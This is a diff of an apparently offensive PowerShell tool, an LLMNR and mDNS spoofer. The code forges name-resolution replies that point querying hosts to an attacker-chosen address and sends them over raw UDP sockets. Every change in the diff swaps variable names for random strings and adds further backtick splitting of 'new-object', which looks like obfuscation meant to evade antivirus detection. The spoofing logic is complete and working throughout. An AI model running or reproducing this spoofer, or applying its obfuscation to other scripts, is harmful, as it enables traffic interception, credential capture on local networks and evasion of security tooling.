-                            $SongsDouble[0] = $DailyDrag.Count + $StickLame.Length + 23
-                            $FriendSquare = "[+]"
+                            $WGGuhBmadSfnyovoozzAiFU[0] += 10
+                            $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV = Get-NameQueryString 12 $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy
+                            $jCjVRMzRHkOITQCWsMvubCjI = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[12..($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Length + 13)]
+                            $SFgDlEjoujEfnZASfFuMxSraXZULd = ($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Split("."))[0]
+                            $WGGuhBmadSfnyovoozzAiFU[0] = $jCjVRMzRHkOITQCWsMvubCjI.Count + $zkTvnUBoWamaHbrMDvklWqGBdwC.Length + 23
+                            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = "[+]"
 
-                            $ThinHarm = $DailyDrag +
+                            $nLYaqWVnOEjFYANgJMXvagRJaxr = $jCjVRMzRHkOITQCWsMvubCjI +
                                                     0x00,0x01,0x00,0x01 +
-                                                    $PourDesign +
+                                                    $GdyRflIiJuuSiRDhkkCMfGiUyIqY +
                                                     0x00,0x04 +
-                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
+                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
                         
-                            $CureGood = 0x14,0xe9 +
-                                                    $StewSmelly[1,0] +
-                                                    $SongsDouble[1,0] +
+                            $lSwsJTeSgkncHgLrQneitzFlSMNMJC = 0x14,0xe9 +
+                                                    $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg[1,0] +
+                                                    $WGGuhBmadSfnyovoozzAiFU[1,0] +
                                                     0x00,0x00 +
-                                                    $ScaleAgree[0,1] +
+                                                    $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0,1] +
                                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                                    $ThinHarm
+                                                    $nLYaqWVnOEjFYANgJMXvagRJaxr
                             
 
-                            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QU" -GustyDance $BoilClever
-                            $FriendSquare = $BabyFlap[0]
-                            $BabyFlap = $BabyFlap[1]
+                            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $SFgDlEjoujEfnZASfFuMxSraXZULd  -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "mDNS" -ZiaZppCfoomElDsdbkRCeNmpgGF "QU" -uemMcbPkfaIvvmaKKrSfGp $QdOGoORVrhoEArPgHPqrqy
+                            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[0]
+                            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[1]
                             
-                            if($BabyFlap -eq '[response sent]')
+                            if($AefzCHMAvhxyPXkVdZDgykCWhRdXo -eq '[response sent]')
                             {
-                                $PlaneUnused = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
-                                $PlaneUnused.SendBufferSize = 1024
-                                $UnableIcy = ne`w-`obje`ct System.Net.IPEndpoint($StuffSky,$LittleLowly)
-                                $PlaneUnused.SendTo($CureGood,$UnableIcy) > $null
-                                $PlaneUnused.Close()
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn = ne`w`-`ob`je`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp )
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn.SendBufferSize = 1024
+                                $FdYctikbNCHGICHHMNaZbrJRddTdYLdWxLR = ne`w`-`ob`je`ct System.Net.IPEndpoint($thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd,$faGTzGnMHxDNWDmxikWiLidyZdMakjiscEflfRBg)
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn.SendTo($lSwsJTeSgkncHgLrQneitzFlSMNMJC,$FdYctikbNCHGICHHMNaZbrJRddTdYLdWxLR) > $null
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn.Close()
                             }
 
-                            $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QU) request $FuelMate received from $StuffSky $BabyFlap") > $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO [$(Get-Date -format s)] mDNS(QU) request $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $AefzCHMAvhxyPXkVdZDgykCWhRdXo") > $null
                         }
-                        elseif(([System.BitConverter]::ToString($ScaleAgree)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
-                            $ScaleAgree[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($ScaleAgree[4..11]) -eq "00-02-00-00-00-00-00-00"))
+                        elseif(([System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy)).EndsWith("-00-01") -and ([System.BitConverter]::ToString(
+                            $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..11]) -eq "00-01-00-00-00-00-00-00" -or [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[4..11]) -eq "00-02-00-00-00-00-00-00"))
                         {
-                            $FuelMate = Get-NameQueryString 12 $ScaleAgree
-                            $DailyDrag = $ScaleAgree[12..($FuelMate.Length + 13)]
-                            $ClubSave = ($FuelMate.Split("."))[0]
-                            $SongsDouble[0] = $DailyDrag.Count + $StickLame.Length + 23
-                            $FriendSquare = "[+]"
+                            $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV = Get-NameQueryString 12 $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy
+                            $jCjVRMzRHkOITQCWsMvubCjI = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[12..($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Length + 13)]
+                            $SFgDlEjoujEfnZASfFuMxSraXZULd = ($jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV.Split("."))[0]
+                            $WGGuhBmadSfnyovoozzAiFU[0] = $jCjVRMzRHkOITQCWsMvubCjI.Count + $zkTvnUBoWamaHbrMDvklWqGBdwC.Length + 23
+                            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = "[+]"
 
-                            $ThinHarm = $DailyDrag +
+                            $nLYaqWVnOEjFYANgJMXvagRJaxr = $jCjVRMzRHkOITQCWsMvubCjI +
                                                     0x00,0x01,0x80,0x01 +
-                                                    $PourDesign +
+                                                    $GdyRflIiJuuSiRDhkkCMfGiUyIqY +
                                                     0x00,0x04 +
-                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
+                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
 
                         
-                            $CureGood = 0x14,0xe9 +
-                                                    $StewSmelly[1,0] +
-                                                    $SongsDouble[1,0] +
+                            $lSwsJTeSgkncHgLrQneitzFlSMNMJC = 0x14,0xe9 +
+                                                    $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg[1,0] +
+                                                    $WGGuhBmadSfnyovoozzAiFU[1,0] +
                                                     0x00,0x00 +
-                                                    $ScaleAgree[0,1] +
+                                                    $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0,1] +
                                                     0x84,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                                    $ThinHarm
+                                                    $nLYaqWVnOEjFYANgJMXvagRJaxr
                    
-                            $BabyFlap = Get-SpooferResponseMessage -ExpectRitzy $ClubSave  -EarBucket "mDNS" -IrateKneel "QM" -GustyDance $BoilClever
-                            $FriendSquare = $BabyFlap[0]
-                            $BabyFlap = $BabyFlap[1]
+                            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $SFgDlEjoujEfnZASfFuMxSraXZULd  -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "mDNS" -ZiaZppCfoomElDsdbkRCeNmpgGF "QM" -uemMcbPkfaIvvmaKKrSfGp $QdOGoORVrhoEArPgHPqrqy
+                            $EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[0]
+                            $AefzCHMAvhxyPXkVdZDgykCWhRdXo = $AefzCHMAvhxyPXkVdZDgykCWhRdXo[1]
                             
-                            if($BabyFlap -eq '[response sent]')
+                            if($AefzCHMAvhxyPXkVdZDgykCWhRdXo -eq '[response sent]')
                             {
-                                $PlaneUnused = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                                $PlaneUnused.SendBufferSize = 1024
-                                $UnableIcy = ne`w-`obje`ct System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
-                                $PlaneUnused.SendTo($CureGood,$UnableIcy) > $null
-                                $PlaneUnused.Close()
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn = ne`w`-`ob`je`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn.SendBufferSize = 1024
+                                $FdYctikbNCHGICHHMNaZbrJRddTdYLdWxLR = ne`w`-`ob`je`ct System.Net.IPEndpoint([IPAddress]"224.0.0.251",5353)
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn.SendTo($lSwsJTeSgkncHgLrQneitzFlSMNMJC,$FdYctikbNCHGICHHMNaZbrJRddTdYLdWxLR) > $null
+                                $OrptnsUgCkAmobwbgqZSthNditPjZYFvn.Close()
                             }
 
-                            $LightOval.output_queue.Add("$FriendSquare [$(Get-Date -format s)] mDNS(QM) request $FuelMate received from $StuffSky $BabyFlap") > $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$EoomeYlDDNonWDhwQANWazgHcsfdMktmTBZHLgOO [$(Get-Date -format s)] mDNS(QM) request $jVlUnrALtsJKQhzNkrGcmmOBoEntmCWzGV received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $AefzCHMAvhxyPXkVdZDgykCWhRdXo") > $null
                         }
                         
                     }
@@ -4430,112 +4430,112 @@ $InnatePrefer =
                     5355 # Microsoft".
                     {
 
-                        if([System.BitConverter]::ToString($ScaleAgree[($ScaleAgree.Length - 4)..($ScaleAgree.Length - 3)]) -ne '00-1c') # Microsoft".
+                        if([System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 4)..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 3)]) -ne '00-1c') # Microsoft".
                         {
-                            $SongsDouble[0] += $ScaleAgree.Length - 2
-                            $TenFish = $ScaleAgree[12..$ScaleAgree.Length]
-                            $LooseMarked = "[+]"
+                            $WGGuhBmadSfnyovoozzAiFU[0] += $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 2
+                            $wyUqLNUBDUpUnkMxjkhFNvEXaBABxlhdDTiLhPlrcHlx = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[12..$NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length]
+                            $hRSKEVuGVxPBlvZBUErJdxFbtRuOMKO = "[+]"
 
-                            $TenFish += $TenFish +
-                                                    $CheapSuperb +
+                            $wyUqLNUBDUpUnkMxjkhFNvEXaBABxlhdDTiLhPlrcHlx += $wyUqLNUBDUpUnkMxjkhFNvEXaBABxlhdDTiLhPlrcHlx +
+                                                    $NzacYfJsqZUHMnRJtpphrZrmhXCbd +
                                                     0x00,0x04 +
-                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$StickLame)).GetAddressBytes()
+                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]$zkTvnUBoWamaHbrMDvklWqGBdwC)).GetAddressBytes()
             
-                            $MonkeyBounce = 0x14,0xeb +
-                                                        $StewSmelly[1,0] +
-                                                        $SongsDouble[1,0] +
+                            $MxUiTohrBdRtfpJJHlVCFuTqPwJHWmdGbVG = 0x14,0xeb +
+                                                        $OXuCGTMzDDdFEBuAMONFVcOInUtkEJnOazqmPChahg[1,0] +
+                                                        $WGGuhBmadSfnyovoozzAiFU[1,0] +
                                                         0x00,0x00 +
-                                                        $ScaleAgree[0,1] +
+                                                        $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0,1] +
                                                         0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00 +
-                                                        $TenFish
+                                                        $wyUqLNUBDUpUnkMxjkhFNvEXaBABxlhdDTiLhPlrcHlx
                 
-                            $BeamWild = [System.Text.Encoding]::UTF8.GetString($ScaleAgree[13..($ScaleAgree.Length - 4)]) -replace "`0",""
+                            $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV = [System.Text.Encoding]::UTF8.GetString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[13..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 4)]) -replace "`0",""
 
-                            if(!$LightOval.request_table.ContainsKey($BeamWild))
+                            if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.ContainsKey($MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV))
                             {
-                                $LightOval.request_table.Add($BeamWild.ToLower(),[Array]$StuffSky.IPAddressToString)
-                                $LightOval.request_table_updated = $true
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.Add($MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV.ToLower(),[Array]$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString)
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
                             }
                             else
                             {
-                                $LightOval.request_table.$BeamWild += $StuffSky.IPAddressToString
-                                $LightOval.request_table_updated = $true
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table.$MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV += $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd.IPAddressToString
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.request_table_updated = $true
                             }
 
-                            $FaxYarn = $false
+                            $ntnYhShhxBBRkzYUvSoZnMK = $false
                 
-                            if($PlugTour -eq 'Y' -and $LightOval.valid_host_list -notcontains $BeamWild -and $StuffSky -ne $SmashDolls)
+                            if($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'Y' -and $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list -notcontains $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV -and $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd -ne $vuBQZyJZNvEjYbTnjNnXebFPrVqHfxqWHlPlJHgkccaYS)
                             {
 
-                                if(($BaseNumber.Exists({param($PlantsIrate) $PlantsIrate -like "20* $BeamWild"})))
+                                if(($YhzxoVOuFgnzQnMstMOTmoSOzs.Exists({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "20* $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV"})))
                                 {
-                                    $RottenBlood = [DateTime]$BaseNumber.Find({param($PlantsIrate) $PlantsIrate -like "20* $BeamWild"}).SubString(0,19)
+                                    $LpVdeZHVNhkvxtTOlLtnRjauixKomzQqjHMsDjnJAdRy = [DateTime]$YhzxoVOuFgnzQnMstMOTmoSOzs.Find({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "20* $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV"}).SubString(0,19)
 
-                                    if((Get-Date) -ge $RottenBlood.AddMinutes($WrongAnts))
+                                    if((Get-Date) -ge $LpVdeZHVNhkvxtTOlLtnRjauixKomzQqjHMsDjnJAdRy.AddMinutes($eEmdEINEKedVTvUFZHbuolOJMVn))
                                     {
-                                        $BaseNumber.RemoveAt($BaseNumber.FindIndex({param($PlantsIrate) $PlantsIrate -like "20* $BeamWild"}))
-                                        $RabbitCake = $true
+                                        $YhzxoVOuFgnzQnMstMOTmoSOzs.RemoveAt($YhzxoVOuFgnzQnMstMOTmoSOzs.FindIndex({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "20* $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV"}))
+                                        $srjDzuBsvTcqdOBkUDftMkUfJnuR = $true
                                     }
                                     else
                                     {
-                                        $RabbitCake = $false
+                                        $srjDzuBsvTcqdOBkUDftMkUfJnuR = $false
                                     }
 
                                 }
                                 else
                                 {           
-                                    $RabbitCake = $true
+                                    $srjDzuBsvTcqdOBkUDftMkUfJnuR = $true
                                 }
                                 
-                                if($RabbitCake)
+                                if($srjDzuBsvTcqdOBkUDftMkUfJnuR)
                                 {
-                                    $NimbleFail = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-ToothWave -WoodWrist 1 -WallWish 255)})
-                                    $SipNail = $NimbleFail.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                                    $NimbleFail = $NimbleFail -replace " ","-"
-                                    $MarkMatter = ne`w-`obje`ct System.Net.Sockets.UdpClient
-                                    $OpenHop = $ScaleAgree[13..($ScaleAgree.Length - 5)]
+                                    $reGOQzOvdgliVtZbzhPvnuOYLhUD = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-rQvIhbCYcgJnjexbvfzYl -RyfnekGrAXltRYKOcZlmehLbXfMrcRXMOsdYDZFzv 1 -MWmmsgTGcAfLneCdvoUydakhVQxIVvPpmvWLoT 255)})
+                                    $AIGnezUlQuvoEPhyAdJgeczjT = $reGOQzOvdgliVtZbzhPvnuOYLhUD.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                                    $reGOQzOvdgliVtZbzhPvnuOYLhUD = $reGOQzOvdgliVtZbzhPvnuOYLhUD -replace " ","-"
+                                    $dImCocHHmdSTrJTKItCYkyCCtpOe = ne`w`-`ob`je`ct System.Net.Sockets.UdpClient
+                                    $dtuvtGkiPDoioapXcwjYbUCrUNWpAXldITvFOJ = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[13..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 5)]
 
-                                    $SofaAnnoy = $SipNail +
+                                    $oaLWOBFwxEFgrjXkRVcPeIBKwTGg = $AIGnezUlQuvoEPhyAdJgeczjT +
                                                             0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00 +
-                                                            ($OpenHop.Length - 1) +
-                                                            $OpenHop +
+                                                            ($dtuvtGkiPDoioapXcwjYbUCrUNWpAXldITvFOJ.Length - 1) +
+                                                            $dtuvtGkiPDoioapXcwjYbUCrUNWpAXldITvFOJ +
                                                             0x00,0x01,0x00,0x01
 
-                                    $HatStew = ne`w-`obje`ct System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
-                                    $MarkMatter.Connect($HatStew)
-                                    $MarkMatter.Send($SofaAnnoy,$SofaAnnoy.Length)
-                                    $MarkMatter.Close()
-                                    $BaseNumber.Add("$(Get-Date -format s) $NimbleFail $BeamWild") > $null
-                                    $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $BeamWild sent to 224.0.0.252") > $null
+                                    $nFvOdtVOkFPwoUWaNJuXrurXnTdxbngnUDBZnoyipDnhT = ne`w`-`ob`je`ct System.Net.IPEndpoint([IPAddress]"224.0.0.252",5355)
+                                    $dImCocHHmdSTrJTKItCYkyCCtpOe.Connect($nFvOdtVOkFPwoUWaNJuXrurXnTdxbngnUDBZnoyipDnhT)
+                                    $dImCocHHmdSTrJTKItCYkyCCtpOe.Send($oaLWOBFwxEFgrjXkRVcPeIBKwTGg,$oaLWOBFwxEFgrjXkRVcPeIBKwTGg.Length)
+                                    $dImCocHHmdSTrJTKItCYkyCCtpOe.Close()
+                                    $YhzxoVOuFgnzQnMstMOTmoSOzs.Add("$(Get-Date -format s) $reGOQzOvdgliVtZbzhPvnuOYLhUD $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV") > $null
+                                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] LLMNR request $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV sent to 224.0.0.252") > $null
                                 }
 
                             }
 
-                            $StitchYak = Get-SpooferResponseMessage -ExpectRitzy $BeamWild -EarBucket "LLMNR" -GustyDance $LipMeat
-                            $LooseMarked = $StitchYak[0]
-                            $StitchYak = $StitchYak[1]
+                            $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza = Get-SpooferResponseMessage -NQpqJdcaPdBxCbTbtuyURGPLJeTMXeilVXTLmURiSyK $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa "LLMNR" -uemMcbPkfaIvvmaKKrSfGp $PFkUZTrIToIoyXaKEeXORSPy
+                            $hRSKEVuGVxPBlvZBUErJdxFbtRuOMKO = $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza[0]
+                            $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza = $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza[1]
 
-                            if($StitchYak -eq '[response sent]')
+                            if($HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza -eq '[response sent]')
                             {
 
-                                if($PlugTour -eq 'N' -or !$BaseNumber.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
+                                if($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'N' -or !$YhzxoVOuFgnzQnMstMOTmoSOzs.Exists({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "* " + [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0..1]) + " *"}))
                                 {
-                                    $IckyFilm = ne`w-`obje`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
-                                    $IckyFilm.SendBufferSize = 1024
-                                    $BucketSkate = ne`w-`obje`ct System.Net.IPEndpoint($StuffSky,$LittleLowly) 
-                                    $IckyFilm.SendTo($MonkeyBounce,$BucketSkate) > $null
-                                    $IckyFilm.Close()
+                                    $LrifOZocGBYpKnMoYsYzPtbDrs = ne`w`-`ob`je`ct System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Raw,[System.Net.Sockets.ProtocolType]::Udp)
+                                    $LrifOZocGBYpKnMoYsYzPtbDrs.SendBufferSize = 1024
+                                    $IDohwUyHhMgJnOaDAPcbDW = ne`w`-`ob`je`ct System.Net.IPEndpoint($thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd,$faGTzGnMHxDNWDmxikWiLidyZdMakjiscEflfRBg) 
+                                    $LrifOZocGBYpKnMoYsYzPtbDrs.SendTo($MxUiTohrBdRtfpJJHlVCFuTqPwJHWmdGbVG,$IDohwUyHhMgJnOaDAPcbDW) > $null
+                                    $LrifOZocGBYpKnMoYsYzPtbDrs.Close()
                                 }
                                 else
                                 {
-                                    $FaxYarn = $true
+                                    $ntnYhShhxBBRkzYUvSoZnMK = $true
                                 }
 
                             }
                            
-                            if(!$FaxYarn)
+                            if(!$ntnYhShhxBBRkzYUvSoZnMK)
                             {
-                                $LightOval.output_queue.Add("$LooseMarked [$(Get-Date -format s)] LLMNR request for $BeamWild received from $StuffSky $StitchYak") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("$hRSKEVuGVxPBlvZBUErJdxFbtRuOMKO [$(Get-Date -format s)] LLMNR request for $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $HVZgZkinqJsSdXQRFLmSIUTZLmJsqoryabeXdJgza") > $null
                             }
 
                         }
@@ -4544,23 +4544,23 @@ $InnatePrefer =
 
                 }
 
-                switch($LittleLowly)
+                switch($faGTzGnMHxDNWDmxikWiLidyZdMakjiscEflfRBg)
                 {
 
                     5355 # Microsoft".
                     {
                     
-                        if($PlugTour -eq 'Y' -and $BaseNumber.Exists({param($PlantsIrate) $PlantsIrate -like "* " + [System.BitConverter]::ToString($ScaleAgree[0..1]) + " *"}))
+                        if($LPmXJzyXqTgdUoElyxFCYzOJzqmSu -eq 'Y' -and $YhzxoVOuFgnzQnMstMOTmoSOzs.Exists({param($ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk) $ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk -like "* " + [System.BitConverter]::ToString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[0..1]) + " *"}))
                         {
-                            $BeamWild = [System.Text.Encoding]::UTF8.GetString($ScaleAgree[13..($ScaleAgree.Length - 4)]) -replace "`0",""
-                            [Byte[]]$WriterAgree = $ScaleAgree[($ScaleAgree.Length - 4)..($ScaleAgree.Length)]
-                            $CauseGround = [System.Net.IPAddress]$WriterAgree
-                            $CauseGround = $CauseGround.IPAddressToString
+                            $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV = [System.Text.Encoding]::UTF8.GetString($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[13..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 4)]) -replace "`0",""
+                            [Byte[]]$KmHTCoFGHVTwFiHiTkIqNElhQHa = $NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy[($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length - 4)..($NhoYvCzdcBtdwhHmrYCBmQwVcFiAfSFCpmgdDiyQbHYy.Length)]
+                            $iYFDCPThQrkRyaqrUbwbjtUbo = [System.Net.IPAddress]$KmHTCoFGHVTwFiHiTkIqNElhQHa
+                            $iYFDCPThQrkRyaqrUbwbjtUbo = $iYFDCPThQrkRyaqrUbwbjtUbo.IPAddressToString
                             
-                            if($LightOval.valid_host_list -notcontains $BeamWild)
+                            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list -notcontains $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV)
                             {
-                                $LightOval.valid_host_list.Add($BeamWild) > $null
-                                $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $BeamWild LLMNR response $CauseGround received from $StuffSky [added to valid host list]") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.valid_host_list.Add($MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV) > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $MrKQFTNhIzMKcZXlZyjkshpRuNzQqQzmISbCV LLMNR response $iYFDCPThQrkRyaqrUbwbjtUbo received from $thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd [added to valid host list]") > $null
                             }
                             
                         }
@@ -4569,23 +4569,23 @@ $InnatePrefer =
 
                 }
 
